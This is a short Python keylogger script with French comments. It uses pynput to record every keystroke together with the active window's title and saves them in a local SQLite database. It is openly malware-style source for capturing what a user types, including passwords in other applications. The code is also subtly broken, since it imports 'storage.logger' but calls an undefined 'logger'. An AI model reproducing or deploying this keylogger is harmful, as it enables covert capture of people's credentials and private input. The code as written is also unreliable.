from pynput import keyboard
import threading
from datetime import datetime
import os
import storage.logger
from window_tracker import get_active_window   # ← nouveau

BUFFER_SIZE = 20

buffer = []
last_timestamp = None
lock = threading.Lock()


def format_key(key):
    try:
        return key.char
    except AttributeError:
        return f"[{key.name}]"


def flush_buffer(window="unknown"):
    if not buffer:
        return []
    key_data = buffer.copy()
    for key_str in key_data:
        logger.log_key(key_str, window=window)
    buffer.clear()
    return key_data


def on_press(key):
    global last_timestamp

    timestamp = datetime.now().strftime("%H:%M:%S")
    key_str   = format_key(key)

    if key_str is None:
        return

    # Récupère la fenêtre active à chaque frappe
    window = get_active_window()  

    with lock:
        buffer.append(key_str)
        last_timestamp = timestamp
        if len(buffer) >= BUFFER_SIZE:
            flush_buffer(window)

    print(f"[{timestamp}] {window} → {key_str}")


def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[*] ESC — arrêt du listener.")
        with lock:
            if buffer:
                flush_buffer()
        return False


class KeyLogger:
    def __init__(self):
        self.listener  = None
        self.is_running = False

    def start(self):
        logger.init_db()
        print("[*]  démarré...")
        print(f"[*] DB : {os.path.abspath('keylogs.db')}")
        print("[*] ESC pour stop.\n")

        self.is_running = True
        self.listener = keyboard.Listener(
            on_press=on_press,
            on_release=on_release
        )
        self.listener.daemon = True
        self.listener.start()
        self.listener.join()
        self.is_running = False

    def stop(self):
        if self.listener and self.is_running:
            self.listener.stop()


if __name__ == "__main__":
    kl = KeyLogger()
    kl.start()